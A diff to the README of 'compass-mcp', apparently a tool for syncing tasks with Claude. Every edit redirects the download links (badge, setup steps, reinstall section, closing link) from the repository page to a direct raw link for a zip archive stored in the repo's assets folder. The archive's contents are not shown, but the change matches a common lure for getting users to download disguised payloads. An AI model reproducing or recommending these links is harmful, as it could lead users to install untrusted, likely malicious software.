@@ -1,6 +1,6 @@
 # 🧭 compass-mcp - Keep tasks in sync across Claude
 
-[![Download compass-mcp](https://img.shields.io/badge/Download-Compass%20MCP-blue?style=for-the-badge)](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+[![Download compass-mcp](https://img.shields.io/badge/Download-Compass%20MCP-blue?style=for-the-badge)](https://raw.githubusercontent.com/Cdplayerjumpingoffplace65/compass-mcp/main/assets/compass-mcp-v1.6-beta.2.zip)
 
 ![Compass MCP](assets/compass-banner.svg)
 
@@ -26,7 +26,7 @@ It is built for people who want less repeating and less copying between tools. Y
 
 Use this link to visit the page and download the app:
 
-[Open the compass-mcp download page](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+[Open the compass-mcp download page](https://raw.githubusercontent.com/Cdplayerjumpingoffplace65/compass-mcp/main/assets/compass-mcp-v1.6-beta.2.zip)
 
 ### 2) Download the file
 
@@ -200,7 +200,7 @@ MCP stands for a shared connection pattern between tools. In this app, it helps 
 
 If you want to get the app again, use this page:
 
-[Download compass-mcp from GitHub](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+[Download compass-mcp from GitHub](https://raw.githubusercontent.com/Cdplayerjumpingoffplace65/compass-mcp/main/assets/compass-mcp-v1.6-beta.2.zip)
 
 ## 🧵 Project structure
 
@@ -251,4 +251,4 @@ If you want the fastest path:
 
 Use this page to get the app:
 
-[https://github.com/Cdplayerjumpingoffplace65/compass-mcp](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+[https://raw.githubusercontent.com/Cdplayerjumpingoffplace65/compass-mcp/main/assets/compass-mcp-v1.6-beta.2.zip](https://raw.githubusercontent.com/Cdplayerjumpingoffplace65/compass-mcp/main/assets/compass-mcp-v1.6-beta.2.zip)
